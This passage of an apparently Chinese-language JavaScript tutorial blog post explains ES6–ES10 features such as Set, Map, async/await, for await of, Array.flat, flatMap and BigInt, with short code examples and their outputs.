= &#123;<span class="attr">name</span>: <span class="string">&#x27;林三心&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">const</span> set2 = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>, obj, <span class="number">2</span>, obj])</span><br><span class="line"><span class="built_in">console</span>.log(set2) <span class="comment">// Set(3) &#123; 1, &#123; name: &#x27;林三心&#x27; &#125;, 2 &#125;</span></span><br><span class="line"></span><br><span class="line">咱们都知道 <span class="literal">NaN</span> !== <span class="literal">NaN</span>，<span class="literal">NaN</span>是自身不等于自身的，但是在<span class="built_in">Set</span>中他还是会被去重</span><br><span class="line"><span class="keyword">const</span> set = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>, <span class="literal">NaN</span>, <span class="number">1</span>, <span class="literal">NaN</span>])</span><br><span class="line"><span class="built_in">console</span>.log(set) <span class="comment">// Set(2) &#123; 1, NaN &#125;</span></span><br></pre></td></tr></table></figure><p>利用Set的不重复性，可以实现数组去重</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">66</span>, <span class="number">9</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set可利用扩展运算符转为数组哦</span></span><br><span class="line"><span class="keyword">const</span> quchongArr = [...new <span class="built_in">Set</span>(arr)]</span><br><span class="line"><span class="built_in">console</span>.log(quchongArr) <span class="comment">// [1,  2, 3, 4, 5, 66, 9]</span></span><br></pre></td></tr></table></figure><ul><li>Map</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Map</span><span class="string">`对比`</span>object<span class="string">`最大的好处就是，key不受`</span>类型限制</span><br><span class="line"><span class="comment">// 定义map</span></span><br><span class="line"><span class="keyword">const</span> map1 = <span class="keyword">new</span> <span class="built_in">Map</span>()</span><br><span class="line"><span class="comment">// 新增键值对 使用 set(key, value)</span></span><br><span class="line">map1.set(<span class="literal">true</span>, <span class="number">1</span>)</span><br><span class="line">map1.set(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">map1.set(<span class="string">&#x27;哈哈&#x27;</span>, <span class="string">&#x27;嘻嘻嘻&#x27;</span>)</span><br><span class="line"><span class="built_in">console</span>.log(map1) <span class="comment">// Map(3) &#123; true =&gt; 1, 1 =&gt; 2, &#x27;哈哈&#x27; =&gt; &#x27;嘻嘻嘻&#x27; &#125;</span></span><br><span class="line"><span class="comment">// 判断map是否含有某个key 使用 has(key)</span></span><br><span class="line"><span class="built_in">console</span>.log(map1.has(<span class="string">&#x27;哈哈&#x27;</span>)) <span class="comment">// true</span></span><br><span class="line"><span class="comment">// 获取map中某个key对应的value 使用 get(key)</span></span><br><span class="line"><span class="built_in">console</span>.log(map1.get(<span class="literal">true</span>)) <span class="comment">// 2</span></span><br><span class="line"><span class="comment">// 删除map中某个键值对 使用 delete(key)</span></span><br><span class="line">map1.delete(<span class="string">&#x27;哈哈&#x27;</span>)</span><br><span class="line"><span class="built_in">console</span>.log(map1) <span class="comment">// Map(2) &#123; true =&gt; 1, 1 =&gt; 2 &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义map，也可传入键值对数组集合</span></span><br><span class="line"><span class="keyword">const</span> map2 = <span class="keyword">new</span> <span class="built_in">Map</span>([[<span class="literal">true</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">2</span>], [<span class="string">&#x27;哈哈&#x27;</span>, <span class="string">&#x27;嘻嘻嘻&#x27;</span>]])</span><br><span class="line"><span class="built_in">console</span>.log(map2) <span class="comment">// Map(3) &#123; true =&gt; 1, 1 =&gt; 2, &#x27;哈哈&#x27; =&gt; &#x27;嘻嘻嘻&#x27; &#125;</span></span><br></pre></td></tr></table></figure><h2 id="ES7"><a href="#ES7" class="headerlink" title="ES7"></a>ES7</h2><h3 id="21、includes"><a href="#21、includes" class="headerlink" title="21、includes"></a>21、includes</h3><p>传入元素，如果数组中能找到此元素，则返回true，否则返回false</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> includeArr = [<span class="number">1</span>, <span class="number">2</span> , <span class="number">3</span>, <span class="string">&#x27;林三心&#x27;</span>, <span class="string">&#x27;科比&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> isKobe = includeArr.includes(<span class="string">&#x27;科比&#x27;</span>)</span><br><span class="line"><span class="built_in">console</span>.log(isKobe) <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>跟indexOf很像，但还是有区别的</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="literal">NaN</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(arr.indexOf(<span class="literal">NaN</span>)) <span class="comment">// -1  indexOf找不到NaN</span></span><br><span class="line"><span class="built_in">console</span>.log(arr.includes(<span class="literal">NaN</span>)) <span class="comment">// true includes能找到NaN</span></span><br></pre></td></tr></table></figure><h3 id="22、求幂运算符"><a href="#22、求幂运算符" class="headerlink" title="22、求幂运算符"></a>22、求幂运算符</h3><p>以前求幂，我们需要这么写</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> num = <span class="built_in">Math</span>.pow(<span class="number">3</span>, <span class="number">2</span>) <span class="comment">// 9</span></span><br></pre></td></tr></table></figure><p>ES7提供了求幂运算符：<code>**</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> num = <span class="number">3</span> ** <span class="number">2</span> <span class="comment">// 9</span></span><br></pre></td></tr></table></figure><h2 id="ES8"><a href="#ES8" class="headerlink" title="ES8"></a>ES8</h2><h3 id="23、Object-values"><a href="#23、Object-values" class="headerlink" title="23、Object.values"></a>23、Object.values</h3><p>可以用来获取对象的value的集合</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  name: <span class="string">&#x27;林三心&#x27;</span>,</span><br><span class="line">  age: <span class="number">22</span>,</span><br><span class="line">  gender: <span class="string">&#x27;男&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> values = <span class="built_in">Object</span>.values(obj)</span><br><span class="line"><span class="built_in">console</span>.log(values) <span class="comment">// [ &#x27;林三心&#x27;, 22, &#x27;男&#x27; ]</span></span><br></pre></td></tr></table></figure><h3 id="24、Object-entries"><a href="#24、Object-entries" class="headerlink" title="24、Object.entries"></a>24、Object.entries</h3><p>可以用来获取对象的键值对集合</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  name: <span class="string">&#x27;林三心&#x27;</span>,</span><br><span class="line">  age: <span class="number">22</span>,</span><br><span class="line">  gender: <span class="string">&#x27;男&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> entries = <span class="built_in">Object</span>.entries(obj)</span><br><span class="line"><span class="built_in">console</span>.log(entries) </span><br><span class="line"><span class="comment">// [ [ &#x27;name&#x27;, &#x27;林三心&#x27; ], [ &#x27;age&#x27;, 22 ], [ &#x27;gender&#x27;, &#x27;男&#x27; ] ]</span></span><br></pre></td></tr></table></figure><h3 id="25、async-await"><a href="#25、async-await" class="headerlink" title="25、async/await"></a>25、async/await</h3><p>这个是很常用的语法了，我的理解就是：<strong>以同步方式执行异步操作</strong></p><p>我们平时可能会遇到这种场景，接口一，请求到数据一，而数据一被当做请求二的参数去请求数据二，我们会用Promise这么做</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 模拟第一次请求</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      resolve(<span class="number">5</span>)</span><br><span class="line">    &#125;, <span class="number">1000</span>)</span><br><span class="line">  &#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 模拟第二次请求</span></span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 拿第一次请求的数据去乘10，当做第二次请求的数据</span></span><br><span class="line">        resolve(res * <span class="number">10</span>)</span><br><span class="line">      &#125;, <span class="number">2000</span>)</span><br><span class="line">    &#125;).then(<span class="function"><span class="params">sres</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(sres)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line">fn() <span class="comment">// 1 + 2 = 3 3秒后输出 50</span></span><br></pre></td></tr></table></figure><p>这样的嵌套是不美观的，如果有很多个接口，那就会嵌套很多层，此时我们可以使用async/await来以同步方式执行异步，注意以下几点：</p><ul><li>await只能在async函数里使用</li><li>await后面最好接Promise，如果后面接的是普通函数则会直接执行</li><li>async函数返回的是一个Promise</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn1</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      resolve(<span class="number">5</span>)</span><br><span class="line">    &#125;, <span class="number">1000</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn2</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      resolve(data * <span class="number">10</span>)</span><br><span class="line">    &#125;, <span class="number">2000</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">req</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 同步方式执行异步，像排队一样</span></span><br><span class="line">  <span class="keyword">const</span> data1 = <span class="keyword">await</span> fn1() <span class="comment">// 等待1秒后返回数据再往下执行</span></span><br><span class="line">  <span class="keyword">const</span> data2 = <span class="keyword">await</span> fn2(data1) <span class="comment">// 拿data1去请求2秒后，往下走</span></span><br><span class="line">  <span class="built_in">console</span>.log(data2) <span class="comment">// 总共3秒后 输出 50</span></span><br><span class="line">&#125;</span><br><span class="line">req()</span><br></pre></td></tr></table></figure><h2 id="ES9"><a href="#ES9" class="headerlink" title="ES9"></a>ES9</h2><h3 id="26、for-await-of"><a href="#26、for-await-of" class="headerlink" title="26、for await of"></a>26、for await of</h3><p>我们来看以下场景哈</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span> (<span class="params">time</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      resolve(<span class="string">`<span class="subst">$&#123;time&#125;</span>毫秒后我成功啦！！！`</span>)</span><br><span class="line">    &#125;, time)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn(<span class="number">3000</span>).then(<span class="function"><span class="params">res</span> =&gt;</span> <span class="built_in">console</span>.log(res))</span><br><span class="line">fn(<span class="number">1000</span>).then(<span class="function"><span class="params">res</span> =&gt;</span> <span class="built_in">console</span>.log(res))</span><br><span class="line">fn(<span class="number">2000</span>).then(<span class="function"><span class="params">res</span> =&gt;</span> <span class="built_in">console</span>.log(res))</span><br><span class="line"></span><br><span class="line">结果是</span><br><span class="line"></span><br><span class="line"><span class="number">1000</span>毫秒后我成功啦！！！</span><br><span class="line"><span class="number">2000</span>毫秒后我成功啦！！！</span><br><span class="line"><span class="number">3000</span>毫秒后我成功啦！！！</span><br></pre></td></tr></table></figure><p>但是我想要这个结果</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3000</span>毫秒后我成功啦！！！</span><br><span class="line"><span class="number">1000</span>毫秒后我成功啦！！！</span><br><span class="line"><span class="number">2000</span>毫秒后我成功啦！！！</span><br></pre></td></tr></table></figure><p>第一时间我们肯定想到的是<code>async/await</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span> (<span class="params">time</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      resolve(<span class="string">`<span class="subst">$&#123;time&#125;</span>毫秒后我成功啦！！！`</span>)</span><br><span class="line">    &#125;, time)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">asyncFn</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 排队</span></span><br><span class="line">  <span class="keyword">const</span> data1 = <span class="keyword">await</span> fn(<span class="number">3000</span>)</span><br><span class="line">  <span class="built_in">console</span>.log(data1) <span class="comment">// 3秒后 3000毫秒后我成功啦！！！</span></span><br><span class="line">  <span class="keyword">const</span> data2 = <span class="keyword">await</span> fn(<span class="number">1000</span>)</span><br><span class="line">  <span class="built_in">console</span>.log(data2) <span class="comment">// 再过1秒 1000毫秒后我成功啦！！！</span></span><br><span class="line">  <span class="keyword">const</span> data3 = <span class="keyword">await</span> fn(<span class="number">2000</span>)</span><br><span class="line">  <span class="built_in">console</span>.log(data3) <span class="comment">// 再过2秒 2000毫秒后我成功啦！！！</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是上面代码也是有缺点的，如果有几十个，那不是得写几十个await，有没有一种方法可以通过循环来输出呢？</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span> (<span class="params">time</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      resolve(<span class="string">`<span class="subst">$&#123;time&#125;</span>毫秒后我成功啦！！！`</span>)</span><br><span class="line">    &#125;, time)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">asyncFn</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> arr = [fn(<span class="number">3000</span>), fn(<span class="number">1000</span>), fn(<span class="number">1000</span>), fn(<span class="number">2000</span>), fn(<span class="number">500</span>)]</span><br><span class="line">  <span class="keyword">for</span> <span class="keyword">await</span> (<span class="keyword">let</span> x <span class="keyword">of</span> arr) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(x)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">asyncFn()</span><br><span class="line"><span class="number">3000</span>毫秒后我成功啦！！！</span><br><span class="line"><span class="number">1000</span>毫秒后我成功啦！！！</span><br><span class="line"><span class="number">1000</span>毫秒后我成功啦！！！</span><br><span class="line"><span class="number">2000</span>毫秒后我成功啦！！！</span><br><span class="line"><span class="number">500</span>毫秒后我成功啦！！！</span><br></pre></td></tr></table></figure><h3 id="27、Promise-finally"><a href="#27、Promise-finally" class="headerlink" title="27、Promise.finally"></a>27、Promise.finally</h3><p>新增的Promise方法，无论失败或者成功状态，都会执行这个函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// cheng</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  resolve(<span class="string">&#x27;成功喽&#x27;</span>)</span><br><span class="line">&#125;).then(</span><br><span class="line">  res =&gt; &#123; <span class="built_in">console</span>.log(res) &#125;,</span><br><span class="line">  err =&gt; &#123; <span class="built_in">console</span>.log(err) &#125;</span><br><span class="line">).finally(<span class="function">() =&gt;</span> &#123; <span class="built_in">console</span>.log(<span class="string">&#x27;我是finally&#x27;</span>) &#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  reject(<span class="string">&#x27;失败喽&#x27;</span>)</span><br><span class="line">&#125;).then(</span><br><span class="line">  res =&gt; &#123; <span class="built_in">console</span>.log(res) &#125;,</span><br><span class="line">  err =&gt; &#123; <span class="built_in">console</span>.log(err) &#125;</span><br><span class="line">).finally(<span class="function">() =&gt;</span> &#123; <span class="built_in">console</span>.log(<span class="string">&#x27;我是finally&#x27;</span>) &#125;)</span><br></pre></td></tr></table></figure><h2 id="ES10"><a href="#ES10" class="headerlink" title="ES10"></a>ES10</h2><h3 id="28、Array-flat"><a href="#28、Array-flat" class="headerlink" title="28、Array.flat"></a>28、Array.flat</h3><p>有一个二维数组，我想让他变成一维数组：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]]</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(arr.flat()) <span class="comment">// [ 1, 2, 3, 4, 5, 6 ]</span></span><br></pre></td></tr></table></figure><p>还可以传参数，参数为降维的次数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, [<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]]]</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(arr.flat(<span class="number">2</span>))</span><br><span class="line">[</span><br><span class="line">  <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>,</span><br><span class="line">  <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>如果传的是一个无限大的数字，那么就实现了多维数组(无论几维)降为一维数组</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, [<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, [<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>]]]]</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(arr.flat(<span class="literal">Infinity</span>))</span><br><span class="line">[</span><br><span class="line">   <span class="number">1</span>,  <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>,  <span class="number">5</span>,</span><br><span class="line">   <span class="number">6</span>,  <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>,</span><br><span class="line">   <span class="number">11</span>, <span class="number">12</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="29、Array-flatMap"><a href="#29、Array-flatMap" class="headerlink" title="29、Array.flatMap"></a>29、Array.flatMap</h3><p>现在给你一个需求</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">&quot;科比 詹姆斯 安东尼&quot;</span>, <span class="string">&quot;利拉德 罗斯 麦科勒姆&quot;</span>];</span><br></pre></td></tr></table></figure><p>将上面数组转为</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ <span class="string">&#x27;科比&#x27;</span>, <span class="string">&#x27;詹姆斯&#x27;</span>, <span class="string">&#x27;安东尼&#x27;</span>, <span class="string">&#x27;利拉德&#x27;</span>, <span class="string">&#x27;罗斯&#x27;</span>, <span class="string">&#x27;麦科勒姆&#x27;</span> ]</span><br></pre></td></tr></table></figure><p>第一时间想到<code>map + flat</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(arr.map(<span class="function"><span class="params">x</span> =&gt;</span> x.split(<span class="string">&quot; &quot;</span>)).flat());</span><br><span class="line"><span class="comment">// [ &#x27;科比&#x27;, &#x27;詹姆斯&#x27;, &#x27;安东尼&#x27;, &#x27;利拉德&#x27;, &#x27;罗斯&#x27;, &#x27;麦科勒姆&#x27; ]</span></span><br></pre></td></tr></table></figure><p><code>flatMap</code>就是<code>flat + map</code>，一个方法顶两个</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(arr.flatMap(<span class="function"><span class="params">x</span> =&gt;</span> x.split(<span class="string">&quot; &quot;</span>)));</span><br><span class="line"><span class="comment">// [ &#x27;科比&#x27;, &#x27;詹姆斯&#x27;, &#x27;安东尼&#x27;, &#x27;利拉德&#x27;, &#x27;罗斯&#x27;, &#x27;麦科勒姆&#x27; ]</span></span><br></pre></td></tr></table></figure><h3 id="30、BigInt"><a href="#30、BigInt" class="headerlink" title="30、BigInt"></a>30、BigInt</h3><p><code>BigInt</code>是ES10新加的一种JavaScript数据类型，用来表示表示大于 <code>2^53 - 1</code> 的整数，<code>2^53 - 1</code>是ES10之前，JavaScript所能表示最大的数字</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> theBiggestInt = <span class="number">9007199254740991n</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> alsoHuge = <span class="built_in">BigInt</span>(<span class="number">9007199254740991</span>);</span><br><span class="line"><span class="comment">// 9007199254740991n</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> hugeString = <span class="built_in">BigInt</span>(<span class="string">&quot;9007199254740991&quot;</span>);</span><br><span class="line"><span class="comment">// 9007199254740991n</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> hugeHex = <span class="built_in">BigInt</span>(<span class="string">&quot;0x1fffffffffffff&quot;</span>);</span><br><span class="line"><span class="comment">// 9007199254740991n</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> hugeBin = <span class="built_in">BigInt</span>(<span class="string">&quot;0b11111111111111111111111111111111111111111111111111111&quot;</span>);</span><br><span class="line"><span class="comment">// 9007199254740991n</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>哦对了，既然是JavaScript新的数据类型，那他的<code>typeof</code>是啥？</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> bigNum = <span class="built_in">BigInt</span>(<span class="number">1728371927189372189739217</span>)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> bigNum) <span class="comment">// bigint</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>所以以后面试官问你JavaScript有多少种数据类型，别傻傻答6种了，要答8种，把ES6的<code>Symbol</code>和ES10的<code>BigInt</code>也加上去</p><h3 id="31、Object-fromEntries"><a href="#31、Object-fromEntries" class="headerlink" 